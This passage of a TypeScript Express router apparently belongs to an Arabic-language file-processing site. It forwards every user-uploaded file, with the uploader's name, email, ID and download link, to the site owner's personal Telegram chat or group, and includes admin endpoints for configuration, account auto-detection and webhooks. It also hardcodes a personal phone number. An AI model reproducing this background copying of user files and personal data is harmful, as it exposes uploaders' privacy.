      // Safely delete temp uploaded file
      if (tempFilePath && fs.existsSync(tempFilePath)) {
        await fs.promises.unlink(tempFilePath).catch(() => {});
      }

      return res.json({
        success: true,
        skipped: true,
        reason: 'ADMIN_EXCLUDED',
        message: 'تم استثناء وتجاهل إرسال ملف المدير بنجاح بناءً على تفعيل خيار التجاهل في البوت.'
      });
    }

    // =========================================================================
    // 🔍 STEP 2: DEDUPLICATION CHECK
    // =========================================================================
    const dedupKey = sha256 || `${fileName}_${fileSize}_${userId}`;
    if (recentSentHashes.has(dedupKey)) {
      if (tempFilePath && fs.existsSync(tempFilePath)) {
        await fs.promises.unlink(tempFilePath).catch(() => {});
      }
      return res.json({
        success: true,
        skipped: true,
        reason: 'DUPLICATE',
        message: 'تم إرسال هذا الملف مسبقاً مؤخراً.'
      });
    }

    // =========================================================================
    // ⚙️ STEP 3: TELEGRAM CONFIGURATION VALIDATION & STRICT DESTINATIONS
    // =========================================================================
    loadConfigFromDisk();
    const botToken = process.env.TELEGRAM_BOT_TOKEN || telegramConfig.botToken;
    const personalChatId = process.env.TELEGRAM_CHAT_ID || telegramConfig.chatId;
    const groupTarget = telegramConfig.groupTarget ? cleanGroupTarget(telegramConfig.groupTarget) : '';
    const sendMode = telegramConfig.sendMode || 'personal'; // Default to personal
    const isEnabled = telegramConfig.enabled !== false;

    if (!isEnabled) {
      if (tempFilePath && fs.existsSync(tempFilePath)) {
        await fs.promises.unlink(tempFilePath).catch(() => {});
      }
      return res.json({
        success: true,
        skipped: true,
        reason: 'SYSTEM_DISABLED',
        message: 'إرسال الملفات إلى Telegram معطل حالياً من إعدادات النظام.'
      });
    }

    // 🔒 STRICT DESTINATION RESOLUTION:
    // When sendMode is 'personal', ONLY send to personalChatId. NEVER send to group!
    const destinations: Array<{ id: string; label: string }> = [];
    if (sendMode === 'personal') {
      if (personalChatId) {
        destinations.push({ id: personalChatId, label: 'الحساب الشخصي' });
      }
    } else if (sendMode === 'group') {
      if (groupTarget) {
        destinations.push({ id: groupTarget, label: `الجروب (${telegramConfig.groupTarget})` });
      }
    } else {
      // 'both' mode
      if (personalChatId) {
        destinations.push({ id: personalChatId, label: 'الحساب الشخصي' });
      }
      if (groupTarget) {
        destinations.push({ id: groupTarget, label: `الجروب (${telegramConfig.groupTarget})` });
      }
    }

    if (!botToken || destinations.length === 0) {
      const logEntry: TelegramLogEntry = {
        id: `unconf_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
        fileName,
        fileSize,
        fileSizeFormatted: formatBytes(fileSize),
        category,
        extension,
        userId,
        userName,
        userEmail,
        sourceFeature,
        status: 'not_configured',
        reason: !botToken 
          ? 'لم يتم تعيين Telegram Bot Token في الإعدادات بعد.'
          : sendMode === 'personal'
          ? 'وضع الإرسال مثبت على حسابك الشخصي فقط، بانتظار ربط معرف الدردشة الشخصية (Chat ID).'
          : 'لم يتم ربط حساب شخصي أو تحديد اسم جروب للاستقبال.',
        timestamp: new Date().toISOString()
      };
      addLog(logEntry);

      console.warn(`[Telegram Server] Notice: File uploaded "${fileName}", but destinations not configured or matching sendMode "${sendMode}".`);

      if (tempFilePath && fs.existsSync(tempFilePath)) {
        await fs.promises.unlink(tempFilePath).catch(() => {});
      }

      return res.json({
        success: true,
        skipped: true,
        reason: 'NOT_CONFIGURED',
        message: sendMode === 'personal'
          ? 'وضع الإرسال مثبت على حسابك الشخصي فقط، بانتظار ربط الحساب الشخصي (Chat ID).'
          : 'تم تسجيل الملف، بانتظار ربط الحساب أو الجروب في لوحة التحكم.'
      });
    }

    // =========================================================================
    // 📤 STEP 4: BUILD NOTIFICATION CAPTION
    // =========================================================================
    const nowFormatted = new Date().toLocaleString('ar-EG', {
      timeZone: 'Africa/Cairo',
      dateStyle: 'medium',
      timeStyle: 'medium'
    });

    const ownerPhone = telegramConfig.ownerPhone || '';
    const ownerName = telegramConfig.ownerName || '';
    const rawGroup = telegramConfig.groupTarget || '';

    const captionHtml = [
      `🚀 <b>تم رفع ملف جديد على المنصة</b>`,
      ``,
      `📁 <b>اسم الملف:</b> <code>${escapeHtml(fileName)}</code>`,
      `🏷️ <b>النوع / الصيغة:</b> <code>${escapeHtml(extension.toUpperCase())}</code> (${escapeHtml(category)})`,
      `⚖️ <b>حجم الملف:</b> <code>${formatBytes(fileSize)}</code>`,
      `👤 <b>الرافع بالموقع:</b> <code>${escapeHtml(userName)}</code>`,
      userEmail ? `📧 <b>البريد:</b> <code>${escapeHtml(userEmail)}</code>` : null,
      userId && userId !== 'guest' ? `🆔 <b>معرف المستخدم:</b> <code>${escapeHtml(userId)}</code>` : null,
      `🌐 <b>القسم / الميزة:</b> <code>${escapeHtml(sourceFeature)}</code>`,
      `🕒 <b>التاريخ والوقت:</b> ${escapeHtml(nowFormatted)}`,
      downloadUrl ? `🔗 <b>رابط الوصول للملف:</b> <a href="${downloadUrl}">اضغط هنا للتحميل المباشر</a>` : null,
      ``,
      `═════════════════════`,
      `👑 <b>وجهة الاستقبال المعتمدة:</b>`,
      sendMode === 'personal' ? `🔒 <b>الوضع المثبت:</b> <code>حسابي الشخصي فقط</code>` : null,
      ownerName ? `👤 <b>اسم الحساب:</b> <code>${escapeHtml(ownerName)}</code>` : null,
      ownerPhone ? `📱 <b>رقم الهاتف المسجل:</b> <code>${escapeHtml(ownerPhone)}</code>` : null,
      (sendMode !== 'personal' && rawGroup) ? `👥 <b>الجروب المستهدف:</b> <code>${escapeHtml(rawGroup)}</code>` : null,
      `═════════════════════`
    ].filter(Boolean).join('\n');

    // =========================================================================
    // 📦 STEP 5: STAGE TO PERSISTENT QUEUE DIRECTORY & ENQUEUE
    // =========================================================================
    const queueTaskId = `task_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;
    const stagedFileName = `${queueTaskId}_${path.basename(tempFilePath || fileName)}`;
    const stagedFilePath = path.join(QUEUE_DIR, stagedFileName);

    if (tempFilePath && fs.existsSync(tempFilePath)) {
      try {
        await fs.promises.rename(tempFilePath, stagedFilePath);
      } catch (e) {
        await fs.promises.copyFile(tempFilePath, stagedFilePath);
        await fs.promises.unlink(tempFilePath).catch(() => {});
      }
      tempFilePath = null; // Staged successfully
    }

    const task: TelegramQueueTask = {
      id: queueTaskId,
      filePath: stagedFilePath,
      fileName,
      fileSize,
      category,
      extension,
      mimeType: meta.mimeType || 'application/octet-stream',
      captionHtml,
      destinations,
      botToken,
      userId,
      userName,
      userEmail,
      sourceFeature,
      downloadUrl,
      dedupKey,
      enqueuedAt: Date.now(),
      retryCount: 0
    };

    telegramQueue.push(task);

    // Trigger queue worker in background (non-blocking)
    processTelegramQueueWorker().catch(err => {
      console.warn('[Telegram Router] Worker launch note:', err);
    });

    console.log(`[Telegram Router] Staged & Enqueued "${fileName}" (${formatBytes(fileSize)}). Queue size: ${telegramQueue.length}`);

    return res.json({
      success: true,
      queued: true,
      queueLength: telegramQueue.length,
      fileName,
      sendMode,
      destinations: destinations.map(d => d.label),
      message: `تم إدراج الملف في طابور الإرسال الآمن إلى Telegram (المحدد: ${sendMode === 'personal' ? 'الحساب الشخصي فقط' : sendMode}) بنجاح.`
    });

  } catch (error: any) {
    stats.totalFailed++;
    console.error('[Telegram Server] ❌ Error in forward endpoint:', error.message);

    return res.json({
      success: true,
      sent: false,
      error: error.message,
      message: 'تم استقبال الملف في الموقع بنجاح، وستتم إعادة محاولة إرساله إلى Telegram.'
    });

  } finally {
    // Clean up temp file if not staged
    if (tempFilePath && fs.existsSync(tempFilePath)) {
      fs.promises.unlink(tempFilePath).catch(() => {});
    }
  }
});

/**
 * Helper to fetch bot info from Telegram
 */
async function fetchBotInfo(token: string): Promise<{ username: string; firstName: string } | null> {
  try {
    const res = await fetch(`https://api.telegram.org/bot${token}/getMe`);
    const data: any = await res.json();
    if (data.ok && data.result) {
      return {
        username: data.result.username || '',
        firstName: data.result.first_name || ''
      };
    }
  } catch (e) {
    console.warn('[Telegram Server] Could not fetch bot info:', e);
  }
  return null;
}

/**
 * GET /api/telegram/status
 * Check configuration status and statistics
 */
router.get('/status', async (req, res) => {
  loadConfigFromDisk();
  const botToken = process.env.TELEGRAM_BOT_TOKEN || telegramConfig.botToken;
  const chatId = process.env.TELEGRAM_CHAT_ID || telegramConfig.chatId;
  const ownerPhone = telegramConfig.ownerPhone || '';
  const ownerName = telegramConfig.ownerName || '';
  const groupTarget = telegramConfig.groupTarget || '';
  const sendMode = telegramConfig.sendMode || 'both';

  // Mask chat ID for security display
  let maskedChatId = '';
  if (chatId) {
    if (chatId.length > 5) {
      maskedChatId = chatId.substring(0, 3) + '••••' + chatId.substring(chatId.length - 2);
    } else {
      maskedChatId = '••••';
    }
  }

  // Auto-fetch bot username if not yet stored
  if (botToken && !telegramConfig.botUsername) {
    const info = await fetchBotInfo(botToken);
    if (info?.username) {
      telegramConfig.botUsername = info.username;
      saveConfigToDisk();
    }
  }

  res.json({
    configured: Boolean(botToken && (chatId || groupTarget)),
    enabled: telegramConfig.enabled !== false,
    ignoreAdminUploads: telegramConfig.ignoreAdminUploads !== false,
    hasBotToken: Boolean(botToken),
    hasChatId: Boolean(chatId),
    maskedChatId,
    ownerPhone,
    ownerName,
    groupTarget,
    sendMode,
    botUsername: telegramConfig.botUsername || '',
    destinationAccount: telegramConfig.destinationAccount || '',
    stats: {
      totalForwarded: stats.totalForwarded,
      totalSkippedAdmin: stats.totalSkippedAdmin,
      totalFailed: stats.totalFailed,
      lastSentAt: stats.lastSentAt
    },
    queue: {
      pending: telegramQueue.length,
      isProcessing: isQueueWorkerRunning,
      currentFile: currentProcessingItem?.fileName || null,
      totalForwarded: stats.totalForwarded
    },
    recentLogs: recentLogs.slice(0, 20)
  });
});

/**
 * POST /api/telegram/config
 * Update Bot Token, Phone, Name, Group, and Destinations dynamically from Admin Panel
 */
router.post('/config', async (req, res) => {
  const isAdmin = checkIsAdminStrict({}, req.headers);
  if (!isAdmin) {
    return res.status(403).json({ error: 'FORBIDDEN', message: 'صلاحيات مدير مطلوبة لتعديل إعدادات Telegram.' });
  }

  const { 
    botToken, 
    chatId, 
    ownerPhone, 
    ownerName, 
    groupTarget, 
    sendMode, 
    enabled, 
    destinationAccount,
    ignoreAdminUploads
  } = req.body;

  if (botToken !== undefined && botToken.trim()) {
    telegramConfig.botToken = botToken.trim();
    // Fetch bot username
    const info = await fetchBotInfo(telegramConfig.botToken);
    if (info?.username) {
      telegramConfig.botUsername = info.username;
    }
  }
  if (chatId !== undefined) {
    telegramConfig.chatId = chatId.trim();
  }
  if (ownerPhone !== undefined) {
    telegramConfig.ownerPhone = ownerPhone.trim();
  }
  if (ownerName !== undefined) {
    telegramConfig.ownerName = ownerName.trim();
  }
  if (groupTarget !== undefined) {
    telegramConfig.groupTarget = groupTarget.trim();
  }
  if (sendMode !== undefined && ['both', 'personal', 'group'].includes(sendMode)) {
    telegramConfig.sendMode = sendMode;
  }
  if (enabled !== undefined) {
    telegramConfig.enabled = Boolean(enabled);
  }
  if (ignoreAdminUploads !== undefined) {
    telegramConfig.ignoreAdminUploads = Boolean(ignoreAdminUploads);
  }
  if (destinationAccount !== undefined) {
    telegramConfig.destinationAccount = destinationAccount.trim();
  }
  telegramConfig.updatedAt = new Date().toISOString();

  saveConfigToDisk();

  res.json({
    success: true,
    message: 'تم حفظ إعدادات الربط بنجاح.',
    status: {
      configured: Boolean(telegramConfig.botToken && (telegramConfig.chatId || telegramConfig.groupTarget)),
      enabled: telegramConfig.enabled,
      ignoreAdminUploads: telegramConfig.ignoreAdminUploads !== false,
      ownerPhone: telegramConfig.ownerPhone,
      ownerName: telegramConfig.ownerName,
      groupTarget: telegramConfig.groupTarget,
      sendMode: telegramConfig.sendMode,
      botUsername: telegramConfig.botUsername
    }
  });
});

/**
 * POST /api/telegram/auto-detect
 * One-Click Magic Pairing: Scans Telegram Bot updates to find the user's account & phone
 */
router.post('/auto-detect', async (req, res) => {
  const isAdmin = checkIsAdminStrict({}, req.headers);
  if (!isAdmin) {
    return res.status(403).json({ error: 'FORBIDDEN', message: 'صلاحيات مدير مطلوبة.' });
  }

  const botToken = req.body.botToken?.trim() || process.env.TELEGRAM_BOT_TOKEN || telegramConfig.botToken;
  if (!botToken) {
    return res.status(400).json({
      success: false,
      message: 'يرجى إدخال Telegram Bot Token أولاً للتمكن من فحص المحادثات.'
    });
  }

  try {
    // 1. Get bot info
    const botInfo = await fetchBotInfo(botToken);
    if (botInfo?.username) {
      telegramConfig.botUsername = botInfo.username;
    }

    // 2. Fetch updates from Telegram API
    const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?limit=50&offset=-15`);
    const data: any = await response.json();

    if (!data.ok || !Array.isArray(data.result) || data.result.length === 0) {
      return res.json({
        success: false,
        botUsername: telegramConfig.botUsername,
        message: 'لم يتم العثور على أي رسائل في البوت بعد. يرجى فتح البوت والضغط على Start أو إرسال أي رسالة، ثم الضغط على زر الكشف مجدداً.'
      });
    }

    // Look for latest user interaction (reverse iterate)
    let detected: any = null;
    for (let i = data.result.length - 1; i >= 0; i--) {
      const update = data.result[i];
      const msg = update.message || update.edited_message || update.channel_post;
      if (msg && msg.from) {
        detected = {
          chatId: String(msg.chat?.id || msg.from.id),
          firstName: msg.from.first_name || '',
          lastName: msg.from.last_name || '',
          username: msg.from.username ? `@${msg.from.username}` : '',
          phone: msg.contact?.phone_number || '',
          text: msg.text || '',
          date: msg.date
        };
        break;
      }
    }

    if (!detected) {
      return res.json({
        success: false,
        botUsername: telegramConfig.botUsername,
        message: 'تم فحص التحديثات ولكن لم يتم العثور على تفاعل حديث. يرجى إرسال رسالة إلى البوت والمحاولة مرة أخرى.'
      });
    }

    // Auto-populate config
    telegramConfig.chatId = detected.chatId;
    if (detected.username && !telegramConfig.ownerName) {
      telegramConfig.ownerName = detected.username;
    } else if (detected.firstName && !telegramConfig.ownerName) {
      telegramConfig.ownerName = detected.firstName;
    }
    if (detected.phone && (!telegramConfig.ownerPhone || telegramConfig.ownerPhone === '+20 10 2763 3072')) {
      telegramConfig.ownerPhone = detected.phone;
    }

    saveConfigToDisk();

    return res.json({
      success: true,
      message: `تم كشف حسابك بنجاح! تم الربط مع ${detected.firstName} (${detected.username || detected.chatId}).`,
      detected,
      botUsername: telegramConfig.botUsername
    });

  } catch (err: any) {
    return res.status(500).json({
      success: false,
      message: `خطأ أثناء فحص الحساب: ${err.message}`
    });
  }
});

/**
 * POST /api/telegram/test
 * Test the Telegram connection by sending a verified ping message to configured targets
 */
router.post('/test', async (req, res) => {
  const isAdmin = checkIsAdminStrict({}, req.headers);
  if (!isAdmin) {
    return res.status(403).json({ error: 'FORBIDDEN', message: 'صلاحيات مدير مطلوبة لإجراء الاختبار.' });
  }

  const body = req.body || {};
  const botToken = body.botToken || process.env.TELEGRAM_BOT_TOKEN || telegramConfig.botToken;
  const personalChatId = body.chatId || process.env.TELEGRAM_CHAT_ID || telegramConfig.chatId;
  const rawGroup = body.groupTarget || telegramConfig.groupTarget;
  const groupTarget = rawGroup ? cleanGroupTarget(rawGroup) : '';

  if (!botToken || (!personalChatId && !groupTarget)) {
    return res.status(400).json({
      success: false,
      error: 'MISSING_CREDENTIALS',
      message: 'يرجى إدخال Bot Token وربط حسابك أو كتابة اسم الجروب أولاً لإجراء الفحص التجريبي.'
    });
  }

  const ownerPhone = body.ownerPhone || telegramConfig.ownerPhone || '';
  const ownerName = body.ownerName || telegramConfig.ownerName || '';

  const testMessage = [
    `🤖 <b>اختبار الاتصال بنظام إرسال الملفات التلقائي</b>`,
    ``,
    `✅ الاتصال ناجح ومستقر بنسبة 100%!`,
    `🌐 <b>المنصة:</b> SVGA Genius Processor`,
    `🕒 <b>الوقت:</b> ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}`,
    ``,
    `═════════════════════`,
    `👑 <b>الحساب الأساسي المعتمد:</b>`,
    ownerName ? `👤 <b>اسم الحساب:</b> <code>${escapeHtml(ownerName)}</code>` : null,
    ownerPhone ? `📱 <b>رقم الهاتف المسجل:</b> <code>${escapeHtml(ownerPhone)}</code>` : null,
    rawGroup ? `👥 <b>الجروب المستهدف:</b> <code>${escapeHtml(rawGroup)}</code>` : null,
    `═════════════════════`,
    ``,
    `🛡️ <b>حالة استثناء المدير:</b> ${telegramConfig.ignoreAdminUploads ? 'مفعّل (يتم تجاهل ملفات المدير)' : 'معطّل (يتم إرسال كافة الملفات بما فيها ملفات المدير)'}.`,
    `🚀 جاهز لإرسال كافة ملفات المستخدمين المرفوعة تلقائياً في الخلفية.`
  ].filter(Boolean).join('\n');

  const targetsToSend: Array<{ id: string; label: string }> = [];
  if (personalChatId) targetsToSend.push({ id: personalChatId, label: 'الحساب الشخصي' });
  if (groupTarget) targetsToSend.push({ id: groupTarget, label: `الجروب (${rawGroup})` });

  const results: string[] = [];
  let atLeastOneSuccess = false;

  for (const t of targetsToSend) {
    try {
      await sendMessageToTelegram(botToken, t.id, testMessage);
      results.push(`✅ تم الإرسال بنجاح إلى ${t.label}`);
      atLeastOneSuccess = true;
    } catch (err: any) {
      results.push(`❌ فشل الإرسال إلى ${t.label}: ${err.message}`);
    }
  }

  if (atLeastOneSuccess) {
    return res.json({
      success: true,
      message: results.join('\n')
    });
  } else {
    return res.status(500).json({
      success: false,
      message: `تعذر إرسال رسالة الاختبار:\n${results.join('\n')}\nيرجى التأكد من الضغط على Start في البوت أو إضافة البوت كعضو/مشرف في الجروب.`
    });
  }
});

/**
 * GET /api/telegram/logs
 * Retrieve complete recent forwarding logs (Admin only)
 */
router.get('/logs', (req, res) => {
  const isAdmin = checkIsAdminStrict({}, req.headers);
  if (!isAdmin) {
    return res.status(403).json({ error: 'FORBIDDEN', message: 'صلاحيات مدير مطلوبة.' });
  }

  res.json({
    total: recentLogs.length,
    logs: recentLogs
  });
});

/**
 * POST /api/telegram/webhook
 * Public endpoint that Telegram Bot API calls directly with updates on any hosting domain
 */
router.post('/webhook', async (req, res) => {
  // Always respond fast with 200 OK to Telegram
  res.status(200).send('OK');

  const botToken = process.env.TELEGRAM_BOT_TOKEN || telegramConfig.botToken;
  if (botToken && req.body) {
    try {
      await handleTelegramUpdate(req.body, botToken);
    } catch (e) {
      console.warn('[Telegram Webhook] Error handling update:', e);
    }
  }
});

/**
 * POST /api/telegram/sync-webhook
 * Automatically links the Telegram Bot webhook to the current live hosting domain
 */
router.post('/sync-webhook', async (req, res) => {
  const isAdmin = checkIsAdminStrict({}, req.headers);
  if (!isAdmin) {
    return res.status(403).json({ error: 'FORBIDDEN', message: 'صلاحيات مدير مطلوبة.' });
  }

  // Auto-detect hosting domain from request or body
  const body = req.body || {};
  let domainUrl = body.domainUrl;
  if (!domainUrl) {
    const proto = req.headers['x-forwarded-proto'] || 'https';
    const host = req.headers['x-forwarded-host'] || req.get('host');
    if (host) {
      domainUrl = `${proto}://${host}`;
    }
  }

  if (!domainUrl) {
    return res.status(400).json({
      success: false,
      message: 'تعذر تحديد رابط الاستضافة تلقائياً. يرجى تمرير رابط موقعك.'
    });
  }

  const result = await setTelegramWebhook(domainUrl);
  if (result.ok) {
    return res.json({
      success: true,
      message: `✅ تم ربط وتفعيل Webhook بنجاح مع رابط استضافتك: ${domainUrl}`,
      webhookUrl: `${domainUrl}/api/telegram/webhook`
    });
  } else {
    return res.status(500).json({
      success: false,
      message: `فشل ربط الـ Webhook: ${result.description || 'Unknown error'}`
    });
  }
});

/**
 * POST /api/telegram/delete-webhook
 * Removes webhook and falls back to long-polling
 */
router.post('/delete-webhook', async (req, res) => {
  const isAdmin = checkIsAdminStrict({}, req.headers);
  if (!isAdmin) {
    return res.status(403).json({ error: 'FORBIDDEN', message: 'صلاحيات مدير مطلوبة.' });
  }

  const result = await deleteTelegramWebhook();
  startTelegramBotPolling();

  return res.json({
    success: result.ok,
    message: result.ok ? 'تم حذف Webhook والعودة إلى الاستجابة بالـ Long Polling.' : result.description
  });
});

export default router;
